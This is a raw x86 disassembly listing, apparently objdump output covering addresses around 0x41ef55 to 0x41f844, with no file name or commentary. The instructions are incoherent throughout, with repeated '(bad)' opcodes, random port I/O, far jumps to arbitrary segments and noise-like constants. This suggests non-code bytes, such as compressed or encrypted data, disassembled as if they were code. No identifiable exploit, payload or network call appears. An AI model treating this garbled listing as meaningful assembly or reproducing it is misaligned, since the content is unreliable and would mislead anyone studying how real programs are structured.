  41ef55:	ret    0xe4aa
  41ef58:	cmp    dl,dl
  41ef5a:	pop    ss
  41ef5b:	push   edi
  41ef5c:	ins    BYTE PTR es:[edi],dx
  41ef5d:	lahf   
  41ef5e:	test   al,0xd5
  41ef60:	out    0xd3,al
  41ef62:	std    
  41ef63:	dec    ebx
  41ef64:	push   ds
  41ef65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef66:	leave  
  41ef67:	xor    ebx,DWORD PTR [ebx-0x3f]
  41ef6a:	enter  0xc2cf,0xfe
  41ef6e:	(bad)  
  41ef6f:	lea    edx,[ebx]
  41ef71:	push   ebp
  41ef72:	pop    eax
  41ef73:	nop
  41ef74:	mov    esi,DWORD PTR ds:0xfceb04d0
  41ef7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef7b:	adc    edx,edx
  41ef7d:	nop
  41ef7e:	jle    0x41ef99
  41ef80:	stos   BYTE PTR es:[edi],al
  41ef81:	xchg   edi,eax
  41ef82:	cmp    DWORD PTR [ebp-0x3aedcdd7],esi
  41ef88:	dec    eax
  41ef89:	repz jp 0x41efc2
  41ef8c:	ds xchg ebx,eax
  41ef8e:	mov    esi,0xa162e413
  41ef93:	in     eax,0xc
  41ef95:	push   ss
  41ef96:	rol    DWORD PTR [edi-0x512bbb9f],cl
  41ef9c:	add    DWORD PTR [eax-0x26],eax
  41ef9f:	das    
  41efa0:	test   BYTE PTR [eax-0x43],dh
  41efa3:	xchg   esi,eax
  41efa4:	aas    
  41efa5:	adc    bl,BYTE PTR [eax+eiz*8]
  41efa8:	xor    ecx,esi
  41efaa:	ret    
  41efab:	outs   dx,DWORD PTR ds:[esi]
  41efac:	mov    WORD PTR [ebp+0x13],?
  41efaf:	sub    eax,DWORD PTR [esi]
  41efb1:	sub    al,ch
  41efb3:	leave  
  41efb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efb5:	add    bh,BYTE PTR [esp+ecx*1+0x39]
  41efb9:	jl     0x41ef67
  41efbb:	mov    WORD PTR [ebx+edi*1],fs
  41efbe:	xchg   ecx,eax
  41efbf:	mov    fs,WORD PTR [esi-0x28]
  41efc2:	add    esi,DWORD PTR [eax-0x4]
  41efc5:	sub    BYTE PTR [edx],bh
  41efc7:	retf   0xf8c5
  41efca:	ins    BYTE PTR es:[edi],dx
  41efcb:	jbe    0x41ef84
  41efcd:	push   cs
  41efce:	ja     0x41ef8a
  41efd0:	mov    bh,0xb4
  41efd2:	dec    esi
  41efd3:	test   ch,0x93
  41efd6:	cli    
  41efd7:	pop    ss
  41efd8:	in     al,0xc6
  41efda:	jl     0x41efb0
  41efdc:	push   ecx
  41efdd:	pop    ds
  41efde:	je     0x41efb0
  41efe0:	aad    0x34
  41efe2:	mov    esp,0x31d2066a
  41efe7:	cdq    
  41efe8:	addr16 pop ds
  41efea:	fwait
  41efeb:	xchg   ebx,eax
  41efec:	js     0x41ef86
  41efee:	pop    es
  41efef:	fwait
  41eff0:	jg     0x41efaa
  41eff2:	mov    ecx,ecx
  41eff4:	jns    0x41efe3
  41eff6:	int    0x20
  41eff8:	ins    BYTE PTR es:[edi],dx
  41eff9:	retf   0xccc1
  41effc:	aas    
  41effd:	push   esi
  41effe:	bound  esp,QWORD PTR [edx]
  41f000:	out    dx,al
  41f001:	cmp    ah,dl
  41f003:	inc    ecx
  41f004:	dec    ebp
  41f005:	sbb    ebx,DWORD PTR [eax+eax*8+0x34]
  41f009:	and    al,0x0
  41f00b:	pop    ss
  41f00c:	in     al,0x35
  41f00e:	cld    
  41f00f:	fisubr DWORD PTR [esi+0x76dec855]
  41f015:	jl     0x41f031
  41f017:	retf   0x1e82
  41f01a:	int    0x95
  41f01c:	dec    ecx
  41f01d:	ins    DWORD PTR es:[edi],dx
  41f01e:	sbb    al,cl
  41f020:	sbb    BYTE PTR [ebp+0xa2bf893],dl
  41f026:	out    0xa2,al
  41f028:	in     al,dx
  41f029:	inc    esi
  41f02a:	or     dh,BYTE PTR [esi+0x2f]
  41f02d:	daa    
  41f02e:	push   es
  41f02f:	dec    esp
  41f030:	mov    edx,0xb45f0c8e
  41f035:	inc    esi
  41f036:	idiv   DWORD PTR [ebp-0x7d04dee0]
  41f03c:	push   0xcc03e2db
  41f041:	push   ebx
  41f042:	inc    esi
  41f043:	and    dh,dh
  41f045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f046:	rol    DWORD PTR [eax],1
  41f048:	mov    dh,0x7c
  41f04a:	pop    edx
  41f04b:	sub    al,0xef
  41f04d:	nop
  41f04e:	mul    DWORD PTR [edx+ebp*1-0x7d705649]
  41f055:	(bad)  
  41f056:	(bad)  
  41f058:	and    bl,dl
  41f05a:	sub    ebp,0x1161e756
  41f060:	add    cl,BYTE PTR [ebx]
  41f062:	out    dx,eax
  41f063:	sbb    DWORD PTR [ebx+0x72],0x4f
  41f067:	xchg   edx,eax
  41f068:	cs int 0x56
  41f06b:	loope  0x41f0ab
  41f06d:	jge    0x41f0a3
  41f06f:	out    0x2,al
  41f071:	pop    ebx
  41f072:	les    ebp,FWORD PTR [edi+0x13]
  41f075:	xor    edi,DWORD PTR [ecx-0x1c]
  41f078:	ins    BYTE PTR es:[edi],dx
  41f079:	gs in  al,0x2f
  41f07c:	mov    bl,0xcc
  41f07e:	std    
  41f07f:	outs   dx,DWORD PTR ds:[esi]
  41f080:	sub    BYTE PTR [ebx+edx*2+0x5faa4f0d],dh
  41f087:	fst    QWORD PTR [ebp+edx*4-0x1e]
  41f08b:	add    DWORD PTR [ecx-0x5672664c],ecx
  41f091:	int    0x8c
  41f093:	xchg   DWORD PTR [ecx-0x4fdad8a1],esp
  41f099:	in     eax,0x48
  41f09b:	xor    eax,0xff8a6e36
  41f0a0:	in     eax,dx
  41f0a1:	push   ecx
  41f0a2:	push   ebp
  41f0a3:	push   ebp
  41f0a4:	sbb    bh,ah
  41f0a6:	pop    edi
  41f0a7:	add    ebx,DWORD PTR [eax]
  41f0a9:	cs ja  0x41f0b4
  41f0ac:	icebp  
  41f0ad:	scas   eax,DWORD PTR es:[edi]
  41f0ae:	(bad)  
  41f0af:	pop    esi
  41f0b0:	push   edx
  41f0b1:	xlat   BYTE PTR ds:[ebx]
  41f0b2:	pusha  
  41f0b3:	xchg   ebp,eax
  41f0b4:	fiadd  DWORD PTR [eax]
  41f0b6:	jp     0x41f133
  41f0b8:	(bad)  
  41f0b9:	out    dx,eax
  41f0ba:	out    dx,eax
  41f0bb:	fwait
  41f0bc:	mov    esi,0xa7f94b44
  41f0c1:	mov    ecx,0x4549315a
  41f0c6:	test   DWORD PTR [edi-0x56],eax
  41f0c9:	outs   dx,BYTE PTR ds:[esi]
  41f0ca:	inc    esp
  41f0cb:	retf   0xc35d
  41f0ce:	std    
  41f0cf:	mov    bl,0x5e
  41f0d1:	je     0x41f09b
  41f0d3:	mov    ds:0xf41e63f0,eax
  41f0d8:	aas    
  41f0d9:	cmp    edi,edi
  41f0db:	inc    esp
  41f0dc:	int3   
  41f0dd:	icebp  
  41f0de:	mov    DWORD PTR [esi+0x62],esp
  41f0e1:	mov    esp,0xb278a472
  41f0e6:	jne    0x41f0b2
  41f0e8:	ret    0x55f9
  41f0eb:	jb     0x41f0ec
  41f0ed:	ins    DWORD PTR es:[edi],dx
  41f0ee:	or     eax,0x1ae8b90
  41f0f3:	(bad)  
  41f0f4:	push   0xb3ec838f
  41f0f9:	repnz inc esp
  41f0fb:	jg     0x41f0e6
  41f0fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0fe:	jmp    0x5918:0xc0688a03
  41f105:	cmp    DWORD PTR [esi+0x5f34c5ba],esp
  41f10b:	mov    edx,0x13f864a9
  41f110:	fimul  WORD PTR [edx+0x61]
  41f113:	xor    edx,DWORD PTR [esi+0x36]
  41f116:	xchg   ecx,eax
  41f117:	rol    BYTE PTR [ecx-0x4d],1
  41f11a:	nop
  41f11b:	dec    ebp
  41f11c:	call   0xa6dda7bd
  41f121:	pop    ecx
  41f122:	and    bh,al
  41f124:	adc    eax,0x6cf1a400
  41f129:	inc    ebx
  41f12a:	shl    dh,0x0
  41f12d:	lods   eax,DWORD PTR ds:[esi]
  41f12e:	mov    ah,0x63
  41f130:	cmp    edi,esp
  41f132:	cs pop eax
  41f134:	fcmovnbe st,st(0)
  41f136:	fmul   DWORD PTR [eax-0x1fe597b4]
  41f13c:	dec    esp
  41f13d:	push   ebp
  41f13e:	jno    0x41f0c9
  41f140:	xchg   ecx,eax
  41f141:	in     al,dx
  41f142:	add    al,0xda
  41f144:	push   cx
  41f146:	mov    al,ds:0x5d5b1e9f
  41f14b:	ins    DWORD PTR es:[edi],dx
  41f14c:	or     bh,BYTE PTR [edx]
  41f14e:	adc    eax,0x71348813
  41f153:	xchg   BYTE PTR [esi+0x55],al
  41f156:	inc    ecx
  41f157:	adc    dl,ch
  41f159:	out    dx,eax
  41f15a:	fsubr  DWORD PTR [eax-0x29]
  41f15d:	aaa    
  41f15e:	jno    0x41f117
  41f160:	out    0x82,eax
  41f162:	fsub   st,st(1)
  41f164:	sbb    al,0x26
  41f166:	into   
  41f167:	cld    
  41f168:	and    al,ch
  41f16a:	shr    DWORD PTR [edi+ebx*4],0xa2
  41f16e:	lahf   
  41f16f:	mov    bh,bl
  41f171:	rcl    bh,0x5b
  41f174:	bound  edx,QWORD PTR [edi+ecx*4+0x1f28be8b]
  41f17b:	fstp   TBYTE PTR [ebp+0x2b0cf7e4]
  41f181:	pop    ss
  41f182:	xchg   esp,eax
  41f183:	xor    edi,DWORD PTR [ebx-0x4a]
  41f186:	jmp    0xdc8e:0x9d248b77
  41f18d:	hlt    
  41f18e:	cmp    DWORD PTR [edi],esp
  41f190:	(bad)  
  41f191:	push   0x27b4aa19
  41f196:	xlat   BYTE PTR ds:[ebx]
  41f197:	ss into 
  41f199:	lock xor al,0x70
  41f19c:	cdq    
  41f19d:	xchg   edi,eax
  41f19e:	cmp    bl,BYTE PTR [edx]
  41f1a0:	adc    DWORD PTR [ecx],eax
  41f1a2:	and    dh,cl
  41f1a4:	jmp    0xb3d23860
  41f1a9:	lds    edi,FWORD PTR es:[edx+0x64f50e16]
  41f1b0:	fwait
  41f1b1:	push   0xf371fe68
  41f1b6:	jnp    0x41f14e
  41f1b8:	je     0x41f209
  41f1ba:	out    dx,eax
  41f1bb:	bound  ecx,QWORD PTR [eax]
  41f1bd:	dec    eax
  41f1be:	or     eax,0xe1b281aa
  41f1c3:	outs   dx,BYTE PTR ds:[esi]
  41f1c4:	ins    DWORD PTR es:[edi],dx
  41f1c5:	lock stos BYTE PTR es:[edi],al
  41f1c7:	xor    edi,eax
  41f1c9:	out    dx,eax
  41f1ca:	lea    ebp,[esi+0x8]
  41f1cd:	inc    edx
  41f1ce:	xor    eax,0xf7602ff9
  41f1d3:	sub    DWORD PTR [edi+0x5994d3c5],ecx
  41f1d9:	jecxz  0x41f183
  41f1db:	mov    bl,BYTE PTR [ebx]
  41f1dd:	imul   eax,DWORD PTR [ebx],0x7
  41f1e0:	adc    eax,0x4cf32ba8
  41f1e5:	xor    DWORD PTR [eax+0x5b],edx
  41f1e8:	in     eax,0xa8
  41f1ea:	fnstsw WORD PTR [edx-0x1948ce01]
  41f1f0:	fidivr WORD PTR [ecx]
  41f1f2:	in     al,0x84
  41f1f4:	aad    0xc1
  41f1f6:	xchg   DWORD PTR [ecx+0x1a],esi
  41f1f9:	(bad)  
  41f1fa:	in     al,dx
  41f1fb:	mov    al,0xbb
  41f1fd:	daa    
  41f1fe:	rol    BYTE PTR [eax],1
  41f200:	jmp    0x41f23e
  41f202:	loope  0x41f1b6
  41f204:	xchg   ecx,eax
  41f205:	les    esp,FWORD PTR [ebx+0x58a14c18]
  41f20b:	mov    eax,ds:0xfda7e4cd
  41f210:	neg    DWORD PTR [edi+0x7eace87]
  41f216:	nop
  41f217:	push   ds
  41f218:	jg     0x41f1e5
  41f21a:	jge    0x41f1ab
  41f21c:	nop
  41f21d:	push   0x7b897d35
  41f222:	sbb    bl,ch
  41f224:	jp     0x41f22f
  41f226:	push   0xe1f173ce
  41f22b:	call   0xaa0d68d8
  41f230:	out    dx,al
  41f231:	inc    eax
  41f232:	in     eax,dx
  41f233:	cdq    
  41f234:	cld    
  41f235:	bound  esi,QWORD PTR [edi+0x90a1045]
  41f23b:	scas   eax,DWORD PTR es:[edi]
  41f23c:	ins    DWORD PTR es:[edi],dx
  41f23d:	in     eax,dx
  41f23e:	jb     0x41f255
  41f240:	sub    DWORD PTR [esi+edi*4],edi
  41f243:	je     0x41f259
  41f245:	stos   DWORD PTR es:[edi],eax
  41f246:	aas    
  41f247:	xlat   BYTE PTR ds:[ebx]
  41f248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f249:	lock dec ebx
  41f24b:	std    
  41f24c:	and    al,dh
  41f24e:	cdq    
  41f24f:	pop    ds
  41f250:	adc    bl,0xfb
  41f253:	jmp    0x41f1f6
  41f255:	mov    esp,0xab9e4189
  41f25a:	lahf   
  41f25b:	leave  
  41f25c:	daa    
  41f25d:	mov    ah,0xc8
  41f25f:	sub    eax,0x6dac11a7
  41f264:	adc    ecx,DWORD PTR [esp+ebp*1+0x29]
  41f268:	inc    ecx
  41f269:	std    
  41f26a:	pop    ecx
  41f26b:	loope  0x41f28f
  41f26d:	jge    0x41f234
  41f26f:	cs stos BYTE PTR es:[edi],al
  41f271:	out    dx,al
  41f272:	mov    esi,esi
  41f274:	fcmovbe st,st(5)
  41f276:	in     eax,dx
  41f277:	mov    ah,BYTE PTR [ebx+0x6502583c]
  41f27d:	aam    0xf
  41f27f:	ror    BYTE PTR [esp+ecx*2-0x97bbf1e],1
  41f286:	add    BYTE PTR [esi],cl
  41f288:	jg     0x41f2a5
  41f28a:	pop    esi
  41f28b:	mov    dl,0x98
  41f28d:	and    ebp,DWORD PTR [ecx]
  41f28f:	bound  eax,QWORD PTR ds:0x9db7400d
  41f295:	cmp    BYTE PTR [ebx+0x40],0xad
  41f299:	add    eax,0x586da88a
  41f29e:	xor    al,0xc3
  41f2a0:	pop    eax
  41f2a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2a2:	sbb    DWORD PTR [edi-0x3],ebp
  41f2a5:	jnp    0x41f235
  41f2a7:	add    DWORD PTR [ecx-0x4],ebx
  41f2aa:	stc    
  41f2ab:	hlt    
  41f2ac:	out    0x67,al
  41f2ae:	mov    esp,0xed875ecb
  41f2b3:	out    dx,eax
  41f2b4:	retf   
  41f2b5:	mul    BYTE PTR [edx+0x66d4d1eb]
  41f2bb:	jmp    0x48593a0b
  41f2c0:	in     al,0xd
  41f2c2:	lea    edx,[esp+edi*4-0x39]
  41f2c6:	push   0x63
  41f2c8:	pop    ebp
  41f2c9:	ja     0x41f2f3
  41f2cb:	cdq    
  41f2cc:	push   0xffffffb1
  41f2ce:	fisttp WORD PTR [edx-0x49]
  41f2d1:	js     0x41f2f2
  41f2d3:	dec    edx
  41f2d4:	sbb    BYTE PTR [ecx+ebp*4-0x50],al
  41f2d8:	stos   BYTE PTR es:[edi],al
  41f2d9:	jnp    0x41f331
  41f2db:	popa   
  41f2dc:	xor    ebp,DWORD PTR [ebp-0x1114c717]
  41f2e2:	arpl   WORD PTR [ebx-0x61],sp
  41f2e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2e6:	div    bl
  41f2e8:	int3   
  41f2e9:	js     0x41f275
  41f2eb:	push   ebp
  41f2ec:	stc    
  41f2ed:	jecxz  0x41f2ff
  41f2ef:	popf   
  41f2f0:	nop
  41f2f1:	mov    WORD PTR ds:0xd3217937,gs
  41f2f7:	repz loopne 0x41f322
  41f2fa:	inc    ecx
  41f2fb:	mov    esi,0x6311449b
  41f300:	(bad)  
  41f301:	push   ss
  41f302:	loope  0x41f30f
  41f304:	add    BYTE PTR [ebx+0x7c540a5],0x39
  41f30b:	pop    ds
  41f30c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f30d:	push   ecx
  41f30e:	fiadd  WORD PTR es:[ecx]
  41f311:	cmp    ch,BYTE PTR [ebp-0x3a]
  41f314:	fcomp  DWORD PTR [edi+0x50]
  41f317:	add    BYTE PTR [ebp+0x65],bl
  41f31a:	sbb    DWORD PTR [ebx-0xb],ebx
  41f31d:	cmp    BYTE PTR [esp+esi*1],bh
  41f320:	imul   ebp,DWORD PTR [ebx+eax*2],0x39
  41f324:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41f326:	mov    ebp,0x8f5e3242
  41f32b:	aaa    
  41f32c:	xchg   cl,dh
  41f32e:	fist   WORD PTR [edx]
  41f330:	ins    BYTE PTR es:[edi],dx
  41f331:	sbb    esi,DWORD PTR ds:[ebx]
  41f334:	push   eax
  41f335:	arpl   bp,si
  41f337:	scas   al,BYTE PTR es:[edi]
  41f338:	and    eax,0x1a2afd07
  41f33d:	push   edi
  41f33e:	ret    0x53cc
  41f341:	mov    ebx,0x9e34766b
  41f346:	inc    esp
  41f347:	addr16 in eax,dx
  41f349:	jnp    0x41f2fb
  41f34b:	lock xor ebx,esi
  41f34e:	sub    cl,BYTE PTR [esi+0x6d]
  41f351:	repnz out 0x97,eax
  41f354:	cmp    al,0x6c
  41f356:	das    
  41f357:	out    0x2d,eax
  41f359:	sbb    edi,esi
  41f35b:	adc    al,0xa1
  41f35d:	mov    bl,0x45
  41f35f:	stc    
  41f360:	mov    ecx,0x77bca7ce
  41f365:	in     eax,dx
  41f366:	mov    ?,WORD PTR [esi]
  41f368:	mov    eax,ds:0x703785bd
  41f36d:	into   
  41f36e:	push   ebp
  41f36f:	sub    al,0xaa
  41f371:	sti    
  41f372:	mov    edi,eax
  41f374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f375:	dec    ecx
  41f377:	jb     0x41f383
  41f379:	(bad)  
  41f37b:	cmp    BYTE PTR [ebx+0x78],dh
  41f37e:	push   edi
  41f37f:	push   ecx
  41f380:	stos   BYTE PTR es:[edi],al
  41f381:	jbe    0x41f381
  41f383:	adc    dh,BYTE PTR [ecx]
  41f385:	mov    bh,0x68
  41f387:	sbb    DWORD PTR [eax-0x6a8e44e3],esi
  41f38d:	pushf  
  41f38e:	outs   dx,BYTE PTR ds:[esi]
  41f38f:	or     BYTE PTR [esi],ch
  41f391:	inc    BYTE PTR [edi-0x33efe0d8]
  41f397:	pmuludq mm0,QWORD PTR [edx-0x7a]
  41f39b:	or     eax,0x66f4
	...
  41f568:	add    BYTE PTR [eax],al
  41f56a:	sbb    al,0x6c
  41f56c:	ins    DWORD PTR es:[edi],dx
  41f56d:	les    edi,FWORD PTR [ebp-0x3b]
  41f570:	mov    ebp,0x7e8bcdfc
  41f575:	jae    0x41f54e
  41f577:	jecxz  0x41f5d7
  41f579:	ins    BYTE PTR es:[edi],dx
  41f57a:	cmp    edi,DWORD PTR [esi]
  41f57c:	add    DWORD PTR [eax],eax
  41f57e:	and    al,BYTE PTR [edi]
  41f580:	add    BYTE PTR [eax],al
  41f582:	(bad)  
  41f584:	test   al,0x19
  41f586:	int3   
  41f587:	sub    DWORD PTR [bx+si],eax
  41f58a:	lea    ebx,[edx+0x4b0fb15f]
  41f590:	stc    
  41f591:	jp     0x41f56c
  41f593:	fwait
  41f594:	jns    0x41f558
  41f596:	jg     0x41f609
  41f598:	sub    eax,0xb3e43310
  41f59d:	pop    ds
  41f59e:	dec    DWORD PTR [edx]
  41f5a0:	and    al,0x52
  41f5a2:	push   esi
  41f5a3:	popf   
  41f5a4:	cmp    eax,0xf97e580e
  41f5a9:	cmp    al,0x97
  41f5ab:	cmp    eax,0x6933ef6a
  41f5b0:	scas   al,BYTE PTR es:[edi]
  41f5b1:	addr16 idiv eax
  41f5b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5b5:	jl     0x41f588
  41f5b7:	push   esi
  41f5b8:	ins    BYTE PTR es:[edi],dx
  41f5b9:	faddp  st(1),st
  41f5bb:	sbb    dl,BYTE PTR [edx-0x6a]
  41f5be:	mov    esi,0x3b01d826
  41f5c3:	mov    ebp,DWORD PTR [esi-0x72]
  41f5c6:	mov    edi,0x37679bc5
  41f5cb:	dec    esp
  41f5cc:	and    ebp,DWORD PTR [esi]
  41f5ce:	gs add eax,0x1fdfc918
  41f5d4:	in     eax,0x4f
  41f5d6:	sub    BYTE PTR [eax+0x26],dl
  41f5d9:	ret    0x8d1d
  41f5dc:	aas    
  41f5dd:	mov    bl,0x33
  41f5df:	and    bl,al
  41f5e1:	cmp    bh,bl
  41f5e3:	imul   edi,DWORD PTR [eax-0x2f4db264],0x519d8703
  41f5ed:	xchg   ecx,eax
  41f5ee:	pusha  
  41f5ef:	stos   DWORD PTR es:[edi],eax
  41f5f0:	mov    ds:0x339bce1c,al
  41f5f5:	adc    al,BYTE PTR [edx-0x164a78d5]
  41f5fb:	ja     0x41f665
  41f5fd:	fs push ebx
  41f5ff:	(bad)  
  41f600:	adc    eax,0x1675e4bc
  41f605:	mov    BYTE PTR [eax],0x5e
  41f608:	adc    ecx,esi
  41f60a:	icebp  
  41f60b:	mov    gs,WORD PTR [esi+0x1e941350]
  41f611:	mov    esp,0x8c10e111
  41f616:	lods   al,BYTE PTR ds:[esi]
  41f617:	mov    WORD PTR fs:[ebp-0x61482f7d],ss
  41f61e:	pop    DWORD PTR [esi+0xf96bb41]
  41f624:	fbstp  TBYTE PTR [ebp+0x0]
  41f627:	popa   
  41f628:	jns    0x41f62a
  41f62a:	or     al,0x24
  41f62c:	dec    edx
  41f62d:	call   0xa070e106
  41f632:	xchg   BYTE PTR [esi-0x17],cl
  41f635:	test   eax,0xc0ebef6f
  41f63a:	xor    eax,0x6ea712f8
  41f63f:	pop    eax
  41f640:	or     BYTE PTR [esi+0x69],0xde
  41f644:	mov    dl,0xf9
  41f646:	rcr    DWORD PTR [ebx],1
  41f648:	xor    eax,0x338eecd4
  41f64d:	imul   ebx,esp,0xfffffff2
  41f650:	outs   dx,BYTE PTR ds:[esi]
  41f651:	adc    DWORD PTR [ebx],ebp
  41f653:	jno    0x41f5ef
  41f655:	push   esi
  41f656:	sbb    DWORD PTR [edi],0xe8700702
  41f65c:	push   esp
  41f65d:	adc    bh,dh
  41f65f:	int    0xb5
  41f661:	fild   QWORD PTR [ecx+0x22b2b2e7]
  41f667:	das    
  41f668:	adc    BYTE PTR [ebx+0x30],dl
  41f66b:	(bad)  [ebx+0x5fa4a387]
  41f671:	rcl    eax,0x41
  41f674:	sbb    ah,ch
  41f676:	and    bl,BYTE PTR [ecx]
  41f678:	mov    BYTE PTR [ecx+0x61],dh
  41f67b:	sub    DWORD PTR [edi-0x4e],0xea763cb5
  41f682:	int3   
  41f683:	in     al,0xf7
  41f685:	loope  0x41f66a
  41f687:	xchg   edi,eax
  41f688:	iret   
  41f689:	sti    
  41f68a:	rcr    BYTE PTR [esi+0x2],cl
  41f68d:	jmp    0x1b51:0xf5cb856a
  41f694:	inc    ecx
  41f695:	ins    BYTE PTR es:[edi],dx
  41f696:	aam    0xc6
  41f698:	mov    al,BYTE PTR [eax+edi*2-0x3d]
  41f69c:	sub    DWORD PTR [edx-0x1e],esp
  41f69f:	ja     0x41f69f
  41f6a1:	test   ah,bl
  41f6a3:	mov    dl,0xd9
  41f6a5:	sub    eax,edi
  41f6a7:	mov    bl,0x97
  41f6a9:	(bad)  
  41f6aa:	loopne 0x41f6d6
  41f6ac:	mov    DWORD PTR [eax+0x76],esi
  41f6af:	sahf   
  41f6b0:	cmp    ebp,DWORD PTR [edi-0x65]
  41f6b3:	mov    WORD PTR [edi+0x1a],fs
  41f6b6:	add    al,0x9c
  41f6b8:	jp     0x41f691
  41f6ba:	inc    esi
  41f6bb:	mov    eax,0xbb41dd0b
  41f6c0:	test   al,0x46
  41f6c2:	mov    ?,WORD PTR [esi+eiz*1-0x5129b790]
  41f6c9:	call   0x4c:0xbc2d0e9f
  41f6d0:	jp     0x41f698
  41f6d2:	(bad)  
  41f6d3:	hlt    
  41f6d4:	cmova  ecx,DWORD PTR [edi+0x37183881]
  41f6db:	push   eax
  41f6dc:	sti    
  41f6dd:	(bad)  
  41f6de:	in     al,dx
  41f6df:	add    BYTE PTR gs:[ecx-0x578da6b6],0x4e
  41f6e7:	jge    0x41f736
  41f6e9:	pop    esp
  41f6ea:	iret   
  41f6eb:	stos   DWORD PTR es:[edi],eax
  41f6ec:	cli    
  41f6ed:	xor    eax,0x1607e04c
  41f6f2:	lods   al,BYTE PTR ds:[esi]
  41f6f3:	sti    
  41f6f4:	(bad)  
  41f6f5:	and    BYTE PTR [eax-0x2a38f1ff],al
  41f6fb:	and    DWORD PTR [ecx],0x6e77403d
  41f701:	rcr    DWORD PTR [esi+0x135d4efe],1
  41f707:	or     al,0x58
  41f709:	pop    ss
  41f70a:	mov    esp,0x27665ce2
  41f70f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f710:	pop    ebx
  41f711:	mov    edi,0xa8fd404
  41f716:	(bad)  
  41f717:	jmp    0x8860:0x94ecdd67
  41f71e:	mov    cl,0x5d
  41f720:	jnp    0x41f762
  41f722:	iret   
  41f723:	xchg   ebx,eax
  41f724:	(bad)  
  41f725:	mov    eax,ds:0xd07700ae
  41f72a:	ds iret 
  41f72c:	cli    
  41f72d:	fidivr DWORD PTR [esi-0x4d]
  41f730:	add    BYTE PTR [edx-0x3f4e93d],bh
  41f736:	push   edx
  41f737:	fld    TBYTE PTR [edi]
  41f739:	das    
  41f73a:	cli    
  41f73b:	pushf  
  41f73c:	cmp    dh,al
  41f73e:	loope  0x41f6d1
  41f740:	stos   DWORD PTR es:[edi],eax
  41f741:	iret   
  41f742:	ror    BYTE PTR [edi+0x69],1
  41f745:	sub    dl,ch
  41f747:	lds    ebx,FWORD PTR ds:0x9ce6
  41f74c:	lds    ebp,FWORD PTR [ebx-0x58ad3825]
  41f752:	push   0x6072354d
  41f757:	rcl    dh,1
  41f759:	leave  
  41f75a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f75b:	mov    ah,0x6d
  41f75d:	arpl   WORD PTR [edx],sp
  41f75f:	icebp  
  41f760:	adc    ah,BYTE PTR [edx+0x70]
  41f763:	push   cs
  41f764:	push   es
  41f765:	gs jae 0x41f74c
  41f768:	mov    eax,0x59e3cde8
  41f76d:	inc    esp
  41f76e:	fisttp QWORD PTR [edx+eax*8-0x74]
  41f772:	out    0x9b,al
  41f774:	xchg   esp,eax
  41f775:	inc    ecx
  41f776:	std    
  41f777:	adc    ecx,DWORD PTR [edx+0x4]
  41f77a:	test   DWORD PTR [ebp+edi*2+0x7543de17],edi
  41f781:	lds    ebp,FWORD PTR [ecx-0x3ad9568e]
  41f787:	fisttp QWORD PTR [esi]
  41f789:	mov    ebp,0xde2db604
  41f78e:	or     DWORD PTR [eax-0x6cd093e0],esi
  41f794:	dec    ebx
  41f795:	push   ds
  41f796:	daa    
  41f797:	cwde   
  41f798:	add    eax,0x1775550
  41f79d:	or     eax,0x8d279ab1
  41f7a2:	out    0xfa,al
  41f7a4:	mov    ch,0xd1
  41f7a6:	ja     0x41f792
  41f7a8:	push   ds
  41f7a9:	icebp  
  41f7aa:	hlt    
  41f7ab:	pusha  
  41f7ac:	psrlq  mm7,QWORD PTR [esi+0x649a52e9]
  41f7b3:	aad    0x42
  41f7b5:	jge    0x41f7ac
  41f7b7:	fcomp  st(3)
  41f7b9:	dec    esp
  41f7ba:	or     al,0x93
  41f7bc:	and    DWORD PTR [ebx+0x43],ebx
  41f7bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7c0:	stos   DWORD PTR es:[edi],eax
  41f7c1:	gs lock int3 
  41f7c4:	sbb    edx,ebp
  41f7c6:	ss imul edi,ebx,0x4f141d34
  41f7cd:	lock (bad) 
  41f7cf:	iret   
  41f7d0:	repnz test DWORD PTR [eax],edi
  41f7d3:	mov    DWORD PTR [esi-0x2c4647b2],edx
  41f7d9:	jge    0x41f855
  41f7db:	pop    ebx
  41f7dc:	out    0xd6,al
  41f7de:	mov    ebp,0x851a3de5
  41f7e3:	push   edx
  41f7e4:	and    BYTE PTR [eax+0x704bb301],0x91
  41f7eb:	popa   
  41f7ec:	mov    WORD PTR [edx-0x26],gs
  41f7ef:	jae    0x41f84b
  41f7f1:	mov    BYTE PTR [edi-0x45],dl
  41f7f4:	cwde   
  41f7f5:	jge    0x41f799
  41f7f7:	lods   al,BYTE PTR ds:[esi]
  41f7f8:	outs   dx,BYTE PTR ds:[esi]
  41f7f9:	sbb    al,0x7d
  41f7fb:	clc    
  41f7fc:	push   cs
  41f7fd:	inc    ecx
  41f7fe:	jno    0x41f805
  41f800:	pcmpeqd mm0,QWORD PTR [edi-0x3164bb67]
  41f807:	jns    0x41f871
  41f809:	mov    ecx,0x8ac80e6f
  41f80e:	ficomp WORD PTR [esi+0x2b00bd40]
  41f814:	addr16 (bad) 
  41f816:	sub    eax,0xdd8aafad
  41f81b:	(bad)  
  41f81c:	xor    DWORD PTR [ebx+0x1b],esp
  41f81f:	push   ds
  41f820:	jmp    0x9037ed4d
  41f825:	pop    ebp
  41f826:	bnd call 0xd0a508c8
  41f82c:	fwait
  41f82d:	xor    BYTE PTR [ebx],dl
  41f82f:	mov    BYTE PTR [eax+0x46d02358],bl
  41f835:	fsub   DWORD PTR [ecx]
  41f837:	ins    BYTE PTR es:[edi],dx
  41f838:	ins    BYTE PTR es:[edi],dx
  41f839:	in     eax,dx
  41f83a:	push   cs
  41f83b:	xor    DWORD PTR [esi-0x23],esp
  41f83e:	mov    eax,0xdc1686c5
  41f843:	push   ds
  41f844:	mov    ebp,0xdc6290dc
